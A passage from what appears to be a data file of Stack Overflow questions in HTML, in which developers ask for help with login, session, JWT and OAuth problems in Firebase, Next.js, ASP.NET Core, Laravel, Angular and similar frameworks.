"<p>I have included FirePeace in the program, but when I try to deal with login and registration errors, it works correctly, but the alert does not appear.</p>
<pre><code>void _EroorMesage_Email() {
    showDialog(
        context: context,
        builder: (context) {
          return const AlertDialog(
            title: Text('The Email proveded is Already in use '),
            backgroundColor: Colors.black38,
          );
        }    );
  }

  void _EroorMesage_Password() {
    showDialog(
        context: context,
        builder: (context) {
          return const AlertDialog(
            title: Text('The Password proveded is Incorrect '),
            backgroundColor: Colors.black38,
          );
        }    );
  }
 Future signUserIn() async {
      try {
        await FirebaseAuth.instance.signInWithEmailAndPassword(
            email: _emilController.text, password: _passwordController.text);
        Navigator.of(context).pushReplacementNamed('/play');
  }     on FirebaseAuthException catch (e) {
        if (e.code == 'user-not-found') {
          _EroorMesage_Email();
          //print(&quot;No user found for that email.&quot;);
        }     else if (e.code == 'wrong-password') {
          //print(&quot;Wrong password provided for that user&quot;);
          _EroorMesage_Password();
        }
      }
    }
</code></pre>
"
"<p>I am building an application with AWS Cognito and Next.js. I am using Amplify's default authtication component below.</p>
<pre><code>'use client'
Amplify.configure(config);

export function App({ signOut, user }: WithAuthenticatorProps) {
  return (
    &lt;&gt;
      &lt;h1&gt;Hello {user?.username}&lt;/h1&gt;
      &lt;button onClick={signOut}&gt;Sign out&lt;/button&gt;
    &lt;/&gt;
  );
}

export default withAuthenticator(App);
</code></pre>
<p>This component does not work without the 'use client' directive. I am curious from a security perspective if this is a concern and if there is any potentially sensitive details one could expose if this component is client side. Thanks!</p>
"
"<p>I've been looking for the cause of this problem and I've already tested several ways that I saw here on Stack Overflow, but nothing seems to solve the problem.</p>
<p>Basically, I'm trying to authenticate through Google, and when I get to the Google account selection page and it returns to my activity, I always see a result of RESULT_CANCELED (0) instead of RESULT_OK (-1), regardless of the account selected. .</p>
<p>I checked that the credentials are configured correctly in the Google Console and that the SHA-1 caves (debug and release) were added correctly. I even deleted my firebase project and created a new one following the step by step instructions but nothing helped.</p>
<p>My call for authentication:</p>
<pre><code> GoogleSignInOptions googleSignInOptions = new                GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestIdToken(getString(R.string.client_id_google))
            .requestEmail()
            .build();

    googleSignInClient = GoogleSignIn.getClient(LoginActivity.this, googleSignInOptions);
    firebaseAuth = FirebaseAuth.getInstance(); 
</code></pre>
<p>And the ActivityResultLauncher that expects the result:</p>
<pre><code>mStartForResult = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
            result -&gt; {
                if (result.getResultCode() == Activity.RESULT_OK) {
                    getInformationSignedAccountGoogle(result.getData());
                }
            });
</code></pre>
"
"<p><strong>Idea:</strong></p>
<p>My Login Page is like this:</p>
<p><a href=""https://i.stack.imgur.com/dEnrv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dEnrv.png"" alt=""enter image description here"" /></a></p>
<p>Users can Authenticate via a JWT token given from a trusted system.
<em>Username</em> is an <em>Audience</em> defined in Token so i can validate that the token issued for that user.</p>
<p><strong>Problem:</strong></p>
<p>i have a razor asp.net core 8.0 app and added <code>JwtBearer</code> in program.cs with default validation parameters:</p>
<pre><code>builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer();
</code></pre>
<p>i want to know how do i properly handle Login in <code>HttpContext.SignInAsync()</code> ? how can i add Validated token to Bearer's Authorization header?</p>
"
"<p>I am working on a full stack application where I am building the front end with Next.js and the back end with Express.js.</p>
<p>In the front end, I am using NextAuth for authentication. I am using both credentials and google providers.</p>
<p>I found that I can’t send the session to the express server to authenticate a user for certain endpoints.</p>
<p>How can I protect the express endpoints for users signing with credentials and Google?</p>
<p>I tried to issue http only cookie from the server but it won’t set to cookie when a user use Google sign in. I also tried accessing the NextAuth session token on the server which worked on development only.</p>
"
"<p>I'm facing an issue with my NextJS/NestJS authentication flow
I'm using NextJS middleware to intercept authentication secure cookies and manage secure routes in Im NextJS frontend, the secure cookies are generated in a different server using NestJS
MY middleware source code:</p>
<pre><code> import { NextRequest } from 'next/server';
import cookie from 'cookie';
import { decodeJwtToken } from './utils/decodejwttoken';

export async function middleware(request: NextRequest) {
 const authRoutes = ['/signin', '/signup'];
 const cookies = cookie.parse(request.headers.get('Cookie') || '');
 const tokenFromHeaders = cookies.token;
 const tokenObj = request.cookies.get('token');
 const tokenFromCookies = tokenObj?.value;
 console.log({ tokenFromCookies, tokenFromHeaders });
...
</code></pre>
<p>In local development, it's working correctly, but after deployment to Vercel I'm getting tokenFromCookies and tokenFromHeaders undefined
Any help will be appreciated, thanks</p>
"
"<p>I was wondering how it could be implemented an authentication system based on JWT where these don't have an explicit expiration date</p>
<ul>
<li>How can be handled the force &quot;expiration&quot;?</li>
<li>Is it possibile without state/session management?</li>
<li>Is this even correct?</li>
</ul>
<p>Edit: I'm perfectly aware about how to implement an &quot;infinite&quot; jwt technically, and what are the implications, I understand perfectly the refresh token system as well,</p>
<p>I want to know how to design a system with this kind of behaviour and keep it secure, giving the capability to expire the tokens for example after an user changes his password, or other possible behaviours</p>
<p>Thanks for all the answers!</p>
"
"<p>I have a web app that is served with Lighttpd. I implemented digest authentication to the application using its Lighttpd's mod_auth module: <a href=""https://redmine.lighttpd.net/projects/lighttpd/wiki/Mod_auth"" rel=""nofollow noreferrer"">https://redmine.lighttpd.net/projects/lighttpd/wiki/Mod_auth</a></p>
<p>Currently it displays a blank white page when user is prompted for username and password. I'd like to be able to customize this page and redirect to the web app once user has logged in successfully. Is this possible?</p>
"
"<p>Im created a login system and i stored the created jwt token in the local storage.Now i need to check is that jwt token is valid or expired when other pages insted of login and sign up pages are loaded.</p>
<p><code>localStorage.setItem(&quot;token&quot;, res.data.token);</code></p>
<p>this is how is stored the jwt in local storage</p>
<p>this is isTokenvalid function to check the token</p>
<pre><code>// utils/auth.js
import jwt from 'jsonwebtoken';

const isTokenValid = (token) =&gt; {
    try {
        const decoded = jwt.verify(token, &quot;kdasdhuwncsda&quot;);
        console.log(decoded);
        return true;
    } catch (err) {
        console.log(err);
        return false;
    }
};

export default isTokenValid;

</code></pre>
<pre><code>'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import isTokenValid from './isTokenValid';

// Main Higher Order Component
const WithAuth = ({ children }) =&gt; {
    const router = useRouter();  // Next.js router

    const [authenticated, setAuthenticated] = useState(false);

    // useEffect to check the validity of the access token when the component mounts
    useEffect(() =&gt; {
        const accessToken = localStorage.getItem('token');
        console.log('Access Token:', accessToken); // Add this line
        const isLoginPage = router.pathname === '/login';
        const isSignupPage = router.pathname === '/signup';

        if (isTokenValid(accessToken) &amp;&amp; (isLoginPage || isSignupPage)) {
            
            setAuthenticated(true);
        } else {
            console.log(&quot;Token is not valid&quot;);
            router.push('/login');  

        }
    }, []); // Include router.pathname in the dependency array

    // Render the children if authenticated
    return authenticated ? &lt;&gt;{children}&lt;/&gt; : null;
};

export default WithAuth;

</code></pre>
<p>This is the high order component i created and wrap around children it in the layout.js file</p>
<p>when this runs it redirect and says that jwt token is invalid and the redirected login page is empty and in console this error massage pops up</p>
<pre><code>TypeError: Right-hand side of 'instanceof' is not an object
    at eval (verify.js:121:58)
    at getSecret (verify.js:98:14)
    at module.exports [as verify] (verify.js:102:10)
    at isTokenValid (isTokenValid.js:6:25)
    at eval (VM120751 withAuth.js:25:70)
    at commitHookEffectListMount (react-dom.development.js:20998:23)
    at invokePassiveEffectMountInDEV (react-dom.development.js:23877:13)
    at invokeEffectsInDev (react-dom.development.js:26666:9)
    at legacyCommitDoubleInvokeEffectsInDEV (react-dom.development.js:26649:5)
    at commitDoubleInvokeEffectsInDEV (react-dom.development.js:26630:7)
    at flushPassiveEffectsImpl (react-dom.development.js:26339:5)
    at flushPassiveEffects (react-dom.development.js:26263:14)
    at eval (react-dom.development.js:26000:9)
    at workLoop (scheduler.development.js:261:34)
    at flushWork (scheduler.development.js:230:14)
    at MessagePort.performWorkUntilDeadline (scheduler.development.js:534:21)
</code></pre>
"
"<p>I'm trying to monitor an api response to know if the user is currently logged in or not. To do so, I'm sending a get request to /api/status along with the http-only cookie. the endpoint should respond with my userid if I am currently logged in. If am logged in, angular should not show the login/register links.
My code is as follows:</p>
<pre><code>export class HeaderComponent implements OnInit {
  authService = inject(AuthService)

  isLoggedIn$ = new BehaviorSubject&lt;Boolean&gt;(false);

  authenticationStatus!: Observable&lt;HttpResponse&lt;object&gt;&gt;;

  constructor() {
    this.authenticationStatus = this.authService.authStatus()

  }
  ngOnInit(): void {
    this.authenticationStatus.subscribe({
      next: (res: any) =&gt; {
        if (res.body) {
          const userId = res.body.message;
          console.log(&quot;User ID: &quot;, userId);
          this.isLoggedIn$.next(true)
          console.log(this.isLoggedIn$.value);
        } else this.isLoggedIn$.next(false)
      },
      error: (err) =&gt; {
        console.log(err)
        this.isLoggedIn$.next(false)
      }
    });
  }
}
</code></pre>
<p>authStatus() : Observable&lt;HttpResponse&gt;{
return this.http.get(<code>${apiUrls.authServiceApi}/status</code>,
{ observe: 'response', withCredentials: true });
}</p>
<p>then in the template, I use:</p>
<pre><code>    &lt;ng-container *ngIf=&quot;!isLoggedIn$.value&quot;&gt;
      &lt;span
        [routerLink]=&quot;['/login']&quot;
        routerLinkActive=&quot;router-link-active&quot;
        class=&quot;text-xl cursor-pointer text-gray-200 font-bold m-3 hover:underline hover:text-indigo-200&quot;
        &gt;Login&lt;/span
      &gt;
      &lt;span
        [routerLink]=&quot;['/register']&quot;
        routerLinkActive=&quot;router-link-active&quot;
        class=&quot;text-xl cursor-pointer text-gray-200 font-bold m-3 hover:underline hover:text-indigo-200&quot;
        &gt;Register&lt;/span
      &gt;
&lt;/ng-container&gt;
</code></pre>
<p>The problem is that the login/register links don't disappear after logging in till I refresh the page. Any ideas?</p>
<p>I'm expecting the isLoggedIn variable to be updated.</p>
"
"<p>I'm adding a bearer token that I copied from an application to the request to my API. In that token, I see the claim &quot;sub&quot; (among several other). Then, in the controller, as I inspect the claims for the identity of my user, I see some - but not all - of them. Subject is gone, names are gone, roles are gone etc.</p>
<p>According to <a href=""https://stackoverflow.com/a/77570602/1525840"">this answer</a>, I need replace a call to <code>Clear()</code> in my handler. The thing is that I have no handler and no code to clear needs to be upgraded. I also tried requiring security tokens as suggested at <a href=""https://learn.microsoft.com/en-us/dotnet/core/compatibility/aspnet-core/8.0/securitytoken-events#recommended-action"" rel=""nofollow noreferrer"">MSDN for breaking changes</a>, with no luck.</p>
<p>How can I get the missing claims into my user's claims?</p>
<pre><code>builder.Services
  .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
  .AddJwtBearer(opt =&gt;
  {
    opt.Authority = &quot;https://sts.windows.net/a2728528-...-7d900c45d9ba/&quot;;
    opt.TokenValidationParameters.ValidateAudience = false;
    opt.TokenValidationParameters.ValidateLifetime = false;
    //opt.UseSecurityTokenValidators = true;
  });
//builder.Services.AddAuthorization();
...
app.UseAuthentication();
app.UseAuthorization();
</code></pre>
<p>After some googling I've found <a href=""https://github.com/AzureAD/azure-activedirectory-identitymodel-extensions-for-dotnet/issues/415"" rel=""nofollow noreferrer"">something from 2016</a>, so probably not even related (despite the shallow resemblance). Naturally, as expected, the following alteration didn't change anything - the claims in the user's identity in the HTTP context on the controller still miss a few items from the JWT.</p>
<pre><code>builder.Services
  .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
  .AddJwtBearer(opt =&gt;
  {
    ...
    opt.TokenValidationParameters.NameClaimType = &quot;sub&quot;;
    opt.TokenValidationParameters.RoleClaimType = &quot;role&quot;;
  });
</code></pre>
"
"<p>I'd like to include a button that allows me to change the language. I checked the Keycloak documentation, and it should be possible to add it from the &quot;theme&quot; section Keycloak Theme <a href=""https://i.stack.imgur.com/FS3Nn.png"" rel=""nofollow noreferrer"">Theme keycloak</a>. However, it didn't appear for me <a href=""https://i.stack.imgur.com/M6Vce.png"" rel=""nofollow noreferrer"">my realm theme keycloak</a>. Could someone share a solution with me for this issue?</p>
<p>I attempted to access the settings from the theme screen.</p>
"
"<p>Im creating an application with nextJS and I need to know how if a user is logged in and tries to access the same account on another device, automatically logout on the first device where he is logged in.</p>
<p>I am handling the authentication with Redux.</p>
<p>I manage the users with firestore and they have a field called isAuthenticated that is set to true or false when the user logs in/logout.</p>
"
"<p>To preface, I am pretty new to Python, using APIs, authentication, and access tokens, so excuse me if I am misinformed.</p>
<p>I have created a Spotipy application that imports my personal listening data into a Google Sheet. My goal with this project is to allow my friends to use it, collect their data (with permission of course), and create a machine learning model from it (not sure what yet). Of course, they will be allowed to see their own listening data as well. I essentially want to create my own version of Receiptify.</p>
<p>The problem I am facing right now is that I am the only person who can use the application since I have authorized myself using my own client id, as well as generated my own access token. I was wondering if I could have some guidance as to how I could allow others to use my application without having to manually provide their own client id.</p>
<p>Here is an example I found: receiptify.herokuapp.com/</p>
<p>tldr - I want to replicate receiptify but I do not know how to allow others to use my application without having them manually provide a client id.</p>
<p>I am happy to answer any further questions or provide some implementation. Thanks to those willing to help!</p>
"
"<p>I have inherited a WordPress application and one of its users cannot login. I opened its admin page and I found that this user's 2FA Status is in the Not Allowed status but I did not know what to do. Please!</p>
"
"<p>I'm working on a React application using AWS Amplify for authentication and Ionic React for the UI. My issue is with the history.push method from react-router-dom, which does not seem to redirect the user after a successful login on the first click, but works on the second click. This behavior occurs in the LoginPage component where, after successful authentication with Amplify, I attempt to redirect the user to the homepage.</p>
<p>Here's a simplified version of my login function and useEffect hook in the LoginPage component:</p>
<pre><code>import React, { useEffect, useState } from 'react';
import { useHistory } from 'react-router-dom';
import { Auth } from 'aws-amplify';
import { IonButton, IonInput, IonPage } from '@ionic/react';

const LoginPage = () =&gt; {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const history = useHistory();

  const login = async () =&gt; {
    try {
      const user = await Auth.signIn(email, password);
      console.log('Login successful:', user);
      history.push('/dashboard'); // Not redirecting on first click
    } catch (error) {
      console.error('Login failed:', error);
    }
  };

  return (
    &lt;IonPage&gt;
      &lt;IonInput value={email} onIonChange={e =&gt; setEmail(e.detail.value)} /&gt;
      &lt;IonInput type=&quot;password&quot; value={password} onIonChange={e =&gt; setPassword(e.detail.value)} /&gt;
      &lt;IonButton onClick={login}&gt;Login&lt;/IonButton&gt;
    &lt;/IonPage&gt;
  );
};

export default LoginPage;
</code></pre>
<p>My homepage:</p>
<pre><code>import { Route, Redirect } from 'react-router-dom'
import { IonRouterOutlet } from '@ionic/react'

import { IonLabel, IonIcon, IonTabs, IonTabBar, IonTabButton } from '@ionic/react'
import { wallet, flash, list, documentTextOutline } from 'ionicons/icons'

import Dashboard from './tabs/DashboardTab'
import PrivateRoute from './auth/PrivateRoute'
import LoginPage from './LoginPage'

const HomePage = ({ match }) =&gt; {
  return (
    &lt;IonTabs&gt;
      &lt;IonRouterOutlet&gt;
        &lt;Route path=&quot;/mobile/login&quot; component={LoginPage} exact={true} /&gt;
        &lt;Route path=&quot;/mobile&quot; render={() =&gt; &lt;Redirect to=&quot;/mobile/dashboard&quot; /&gt;} exact={true} /&gt;

        &lt;PrivateRoute path=&quot;/mobile/dashboard&quot; component={Dashboard} exact={true} /&gt;
      &lt;/IonRouterOutlet&gt;

      &lt;IonTabBar slot=&quot;bottom&quot;&gt;
        &lt;IonTabButton tab=&quot;tab1&quot; href=&quot;/mobile/dashboard&quot;&gt;
          &lt;IonIcon icon={flash} /&gt;
          &lt;IonLabel&gt;Dashboard&lt;/IonLabel&gt;
        &lt;/IonTabButton&gt;
       
      &lt;/IonTabBar&gt;
    &lt;/IonTabs&gt;
  )
}

export default HomePage
</code></pre>
<p>PrivateRoute:</p>
<pre><code>import React, { useState, useEffect } from 'react'
import { Route, Redirect } from 'react-router-dom'
import { Auth } from 'aws-amplify'
import { IonSpinner } from '@ionic/react'
import { useLocation } from 'react-router-dom'

const PrivateRoute = ({ component: Component, render, ...rest }) =&gt; {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [checkingStatus, setCheckingStatus] = useState(true)
  const [user, setUser] = useState(null)

  const location = useLocation()

  useEffect(() =&gt; {
    checkAuthState()
  }, [location])

  async function checkAuthState() {
    setCheckingStatus(true)
    try {
      const currentUser = await Auth.currentAuthenticatedUser()
      setIsLoggedIn(true)
      setUser(currentUser)
    } catch (error) {
      console.error('Not logged in', error)
      setIsLoggedIn(false)
    } finally {
      setCheckingStatus(false)
    }
  }
  return (
    &lt;Route
      {...rest}
      render={(props) =&gt;
        checkingStatus ? (
          &lt;div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}&gt;
            &lt;IonSpinner name=&quot;crescent&quot; /&gt;
          &lt;/div&gt;
        ) : isLoggedIn ? (
          render ? (
            render({ ...props, user })
          ) : (
            &lt;Component {...props} user={user} /&gt;
          )
        ) : (
          &lt;Redirect to=&quot;/mobile/login&quot; /&gt;
        )
      }
    /&gt;
  )
}

export default PrivateRoute
</code></pre>
"
"<p>I try to implement ldap user authentication using the ldaprecord package with Laravel 8. Although user authentication is successful, I cannot access the session when I check it through the middleware.</p>
<p>After Auth::login($user), Auth::check() method returns true, somehow on Auth Middleware it return false. I use file for session_driver. The file is created at storage/framework/sessions successfully, so permissions look okay to me. What should I pay attention to for the session to be permanent?</p>
<p><strong>AuthController.php</strong></p>
<pre><code> class AuthController extends Controller
    {
        public function getLogin(){
            return view('login');
        }
    
        public function postLoginForm(Request $request){
            $request-&gt;validate([
                'username' =&gt; 'required',
                'password' =&gt; 'required',
            ]);
    
            $username = $request-&gt;username . &quot;@iegm.local&quot;;
            $connection = Container::getConnection('default');
    
            if ($connection-&gt;auth()-&gt;attempt($username, $request-&gt;password)) {
                $user = User::firstOrCreate(['username' =&gt; $request-&gt;username], [
                    'is_admin' =&gt; 0,
                    'is_active' =&gt; 1
                ]);
                Auth::login($user);
                dd(Auth::check()); // --&gt; return true

                return redirect()-&gt;route('get.anasayfa');
            }
    
            return back()-&gt;with('fail', 'basarisiz');
        }
    
        public function logout() {
            Session::flush();
            Auth::logout();
    
            return redirect('login');
        }
    }
</code></pre>
<p><strong>auth.php</strong></p>
<pre><code>&lt;?php

return [

    'defaults' =&gt; [
        'guard' =&gt; 'web',
        'passwords' =&gt; 'users',
    ],

    'guards' =&gt; [
        'web' =&gt; [
            'driver' =&gt; 'session',
            'provider' =&gt; 'ldap',
        ],
    ],

    'providers' =&gt; [
        'ldap' =&gt; [
            'driver' =&gt; 'ldap',
            'model' =&gt; App\Models\LdapUser::class,
        ],
    ],  
];
</code></pre>
<p><strong>Kernel.php</strong></p>
<pre><code>&lt;?php

namespace App\Http;

use Illuminate\Foundation\Http\Kernel as HttpKernel;

class Kernel extends HttpKernel
{
   
    protected $middlewareGroups = [
        'web' =&gt; [
            \App\Http\Middleware\EncryptCookies::class,
            \Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse::class,
            \Illuminate\Session\Middleware\StartSession::class,
            \Illuminate\Session\Middleware\AuthenticateSession::class,
            \Illuminate\View\Middleware\ShareErrorsFromSession::class,
            \App\Http\Middleware\VerifyCsrfToken::class,
            \Illuminate\Routing\Middleware\SubstituteBindings::class,
        ],

        'api' =&gt; [
            // \Laravel\Sanctum\Http\Middleware\EnsureFrontendRequestsAreStateful::class,
            'throttle:api',
            \Illuminate\Routing\Middleware\SubstituteBindings::class,
        ]
    ];

   
    protected $routeMiddleware = [
        'auth' =&gt; \App\Http\Middleware\Authenticate::class,
        'auth.basic' =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,
        'cache.headers' =&gt; \Illuminate\Http\Middleware\SetCacheHeaders::class,
        'can' =&gt; \Illuminate\Auth\Middleware\Authorize::class,
        'guest' =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class,
        'password.confirm' =&gt; \Illuminate\Auth\Middleware\RequirePassword::class,
        'signed' =&gt; \Illuminate\Routing\Middleware\ValidateSignature::class,
        'throttle' =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class,
        'verified' =&gt; \Illuminate\Auth\Middleware\EnsureEmailIsVerified::class,
        'log' =&gt; \App\Http\Middleware\LogMiddleware::class,
    ];
}
</code></pre>
<p><strong>web.php</strong></p>
<pre><code>Route::middleware(['auth'])-&gt;group(function () {
    Route::get('/', [AnasayfaController::class, 'index'])-&gt;name('get.anasayfa');
});
</code></pre>
<p><strong>Authenticate.php</strong></p>
<pre><code>&lt;?php

namespace App\Http\Middleware;

use Illuminate\Auth\Middleware\Authenticate as Middleware;

class Authenticate extends Middleware
{
    protected function redirectTo($request)
    {
        dd(Auth::check()) // --&gt; return false
        if (! $request-&gt;expectsJson()) {
            return route('get.login');
        }
    }
}
</code></pre>
<p><strong>RouteServiceProvider.php</strong></p>
<pre><code>&lt;?php

namespace App\Providers;

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;

class RouteServiceProvider extends ServiceProvider
{
    public const HOME = '/home';

    protected $namespace = 'App\Http\Controllers';

    public function boot()
    {
        $this-&gt;configureRateLimiting();

        $this-&gt;routes(function () {
            Route::prefix('api')
                -&gt;middleware('api')
                -&gt;namespace($this-&gt;namespace)
                -&gt;group(base_path('routes/api.php'));

            Route::middleware('web')
                -&gt;namespace($this-&gt;namespace)
                -&gt;group(base_path('routes/web.php'));
        });
    }

    protected function configureRateLimiting()
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)-&gt;by(optional($request-&gt;user())-&gt;id ?: $request-&gt;ip());
        });
    }
}
</code></pre>
"
"<p>For Auth Provider, I've added following code: <a href=""https://gist.github.com/sujit-baniya/e03ba25858d92dc4d198533d6889a82a"" rel=""nofollow noreferrer"">https://gist.github.com/sujit-baniya/e03ba25858d92dc4d198533d6889a82a</a></p>
<p>Scenario:<br />
I can login in new tab and store the data in localstorage and redirects me to dashboard. But the issue happens after I logout of the application and try to re-login. The response is received from server for logged in user but it doesn't redirects me to dashboard. I've to refresh the page to re-login.</p>
<p>Code snippet:</p>
<pre><code>const logout = () =&gt; {
    auth
        .logout()
        .then((_response: any) =&gt; {
            setLoggedIn(false);
            setLoggedOut(true);
            auth.setAuthUser(null);
            userStore.setUser(null);
            secureLocalStorage.clear()
            // Navigate me to login after logout
            // Cannot re-login until page is refreshed
            navigate(&quot;/login?loggedOut=true&quot;);
        })
        .catch((error: any) =&gt; {
            console.info(&quot;Failed to logout user: %o&quot;, error);
            throw error;
        });
};
const login = (user?: User) =&gt; {
    if (localStorage.getItem(&quot;auth-key&quot;) &amp;&amp; user) {
        auth.setAuthUser(Object.setPrototypeOf(user, User.prototype));
        userStore.setUser(Object.setPrototypeOf(user, User.prototype));
        setLoggedIn(true);
        setLoggedOut(false);
    }
    navigate(&quot;/&quot;);
};
</code></pre>
<p>I'm not sure what is going on and how could I fix this issue. I would appreciate any help</p>
"
"<p><strong>How auth0 and normal registration/create account works in web application simultaneously providing both options to user ?</strong></p>
<ol>
<li>How does it works ?</li>
<li>What is the flow/approach to do the same in my MERN application ?</li>
</ol>
<p><a href=""https://i.stack.imgur.com/Riwbg.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Riwbg.png"" alt=""Signin page of Udemy"" /></a></p>
<ol>
<li><p>There are some other details which we take from user while creating account with the traditional way ?</p>
</li>
<li><p>But what with auth0 ?</p>
</li>
</ol>
<p>This is my MERN project here -
<a href=""https://petcare-mohitjaiswal.netlify.app"" rel=""nofollow noreferrer"">petcare-mohitjaiswal.netlify.app</a></p>
"
"<p>so i am building a simple transaction application to build my skills and i am new to authentication i am using localstorage to create &quot;tokenn&quot; item whenver a user signs in/ signs up
I want to check if the user has tokenn then they should not access the signin signup pages (ie redirected to the Dashboard page) and vice verca for not having the tokenn</p>
<p>i did hell lot of things to tackle tried conditional rendering, tried to add a authCheck component to components which should be shown to signed users etc etc
but everytime i came to two things</p>
<ol>
<li>not working</li>
<li>working but need to refresh (in both cases ie when unauthenticated users try to navigate to Dashboard and other components as well as authenticated users try to navigate to signin and other components)</li>
</ol>
<p>here is the App.jsx code where i tried
<a href=""https://github.com/mujtbkhn/paytm-mujtaba-frontend/blob/main/src/App.jsx"" rel=""nofollow noreferrer"">app.jsx</a></p>
<p>i also tried checking if the token exists then show this else this and various other things but nothing is working</p>
<p>If someone can help me with this it would be really really appreciated
also heres the git repo for this : <a href=""https://github.com/mujtbkhn/paytm-mujtaba-frontend"" rel=""nofollow noreferrer"">frontend</a>
<a href=""https://paytm-mujtaba.netlify.app/"" rel=""nofollow noreferrer"">live</a></p>
"
"<p>I'm developing a library for authentication using @azure/msal-node, however, for each type of application, there is a specific class. For instance, ConfidentialClientApps for web app, web API, service/daemon. PublicClientApps for desktop app, browserless API, mobile app. Is there a way to develop an application that encompasses various types of applications?</p>
<p>I'm testing this code, but it's not comprehensive enough to encompass non-web applications.</p>
<pre><code>class MicrosoftUserSigninController {
  async handle(request: Request, response: Response): Promise&lt;void&gt; {

    const confidentialClientConfig = {
      auth: {
        clientId: process.env.CLIENT_ID,
        authority: process.env.AUTHORITY,
        clientSecret: process.env.CLIENT_SECRET,
        redirectUri: process.env.REDIRECT_URI,
        scopes: ['user.read'],
        state: state,
      },
    };

    const confidentialClientApplication =
      new msal.ConfidentialClientApplication(confidentialClientConfig);

    const authCodeRequest = {
      redirectUri: confidentialClientConfig.auth.redirectUri,
      authority: confidentialClientConfig.auth.authority,
      scopes: confidentialClientConfig.auth.scopes,
      state: confidentialClientConfig.auth.state,
    };

    const getAuthCode = async (authority, scopes, state, res) =&gt; {
      console.log('Auth code: ');
      authCodeRequest.authority = authority;
      authCodeRequest.scopes = scopes;
      authCodeRequest.state = state;

      try {
        const authCodeUrl = await confidentialClientApplication.getAuthCodeUrl(
          authCodeRequest
        );
        console.log(`URL: ${authCodeUrl}`);
        res.redirect(authCodeUrl);
      } catch (error) {
        console.error('Error:', error);
        res.status(500).send(error.message || 'Error');
      }
    };

    await getAuthCode(
      confidentialClientConfig.auth.authority,
      confidentialClientConfig.auth.scopes,
      confidentialClientConfig.auth.state,
      response
    );

    const tokenRequest = {
      //code: code,
    
      redirectUri: confidentialClientConfig.auth.redirectUri,
      scopes: confidentialClientConfig.auth.scopes,
    };

    confidentialClientApplication
      .acquireTokenByCode(tokenRequest)
      .then((response) =&gt; {
        console.log('\nResponse: \n:', response);
      })
      .catch((error) =&gt; {
        console.log(error);
      });
  }
}
</code></pre>
"
"<p>i've seen many different answers to this and just want some clarification, i use MERN but im sure the answer will be similar if not identical for other stacks/technologies. The way i see it using https post requests with the credentials in the body and then salt/hashing the password server side before storing it in the database and then salt/hash and compare when the user wants to login is safe.I have been told that this method is insecure although the only improvement i can see would be hashing client side before sending to the server(but i see the issues with this too).</p>
<p>I am using jwt and session cookies to maintain login status and using a custom middleware to verify user authentication and authorisation before sending a response from the server either with the request or redirecting if the user has invalid details. I know it is a rather vague question but any help in the form of suggestions/ links would be much appreciated.</p>
"
"<p>I followed <a href=""https://learn.microsoft.com/en-us/aspnet/web-api/overview/security/authentication-filters"" rel=""nofollow noreferrer"">this</a> guide to setup authentication filters in an API I created. It was all pretty easy and went well except now when testing, I get this exception</p>
<blockquote>
<p>No authenticationScheme was specified, and there was no DefaultChallengeScheme found. The default schemes can be set using either AddAuthentication(string defaultScheme) or AddAuthentication(Action configureOptions).</p>
</blockquote>
<p>whenever I try to hit an endpoint.</p>
<p>I've looked at <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authentication/?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">this guide</a> as well, where it does set the <code>authenticationScheme</code> like so</p>
<pre><code>builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(JwtBearerDefaults.AuthenticationScheme,
        options =&gt; builder.Configuration.Bind(&quot;JwtSettings&quot;, options))
    .AddCookie(CookieAuthenticationDefaults.AuthenticationScheme,
        options =&gt; builder.Configuration.Bind(&quot;CookieSettings&quot;, options));
</code></pre>
<p>but I don't want any of these. Is there a way to just use authentication filter's via attribute syntax?</p>
<p>Here is how I have it setup.</p>
<p>Basic filter:</p>
<pre><code>[AttributeUsage(AttributeTargets.All)]
public class BasicFilter : AuthorizeAttribute, IAuthenticationFilter
{        
    async public Task AuthenticateAsync(HttpAuthenticationContext context, CancellationToken cancellationToken)
    {
        BaseRequest? request = await AuthenticationHelper.RequestIsValid&lt;BaseRequest&gt;(context);
        if (request == null)
        {
            context.ErrorResult = new AuthenticationFailureResult(context.Request);
            return;
        }

        GenericPrincipal principal = new GenericPrincipal(new GenericIdentity(&quot;User&quot;), null);
        context.Principal = principal;
    }

    public Task ChallengeAsync(HttpAuthenticationChallengeContext context, CancellationToken cancellationToken)
    {
        var challenge = new AuthenticationHeaderValue(&quot;None&quot;);
        context.Result = new ChallengeUnauthorizedResult(challenge, context.Result);

        return Task.FromResult(0);
    }
}
</code></pre>
<p>And then just throw a <code>[BasicFilter]</code> and <code>[Authorize]</code> attribute on an endpoint like so:</p>
<pre><code>    [Authorize]
    [BasicFilter]
    [HttpPost]
    async public Task&lt;ActionResult&gt; CreateAccount()
    {
    }
</code></pre>
"
"<p>Im trying to call an API from power bi desktop using the web connector. I have the url which includes a query. I also have a Key which i will be using for connecting from power bi to that api.</p>
<p>I tried the below options:</p>
<ol>
<li><p>Use Web connector --&gt; Advanced --&gt; In the headers, creates &quot;Authorization&quot; and provided the key, it failed with the error &quot;A web API key can only be specified when a web API key name is provided&quot;</p>
</li>
<li><p>M Query --&gt; Web.Contents(&quot;https://api.xyz.com/page-metrics/get&quot;,[ApiKeyName=&quot;x_api_key&quot;]), and passed the Key in the &quot;Key&quot; prompt using WEB API credential.</p>
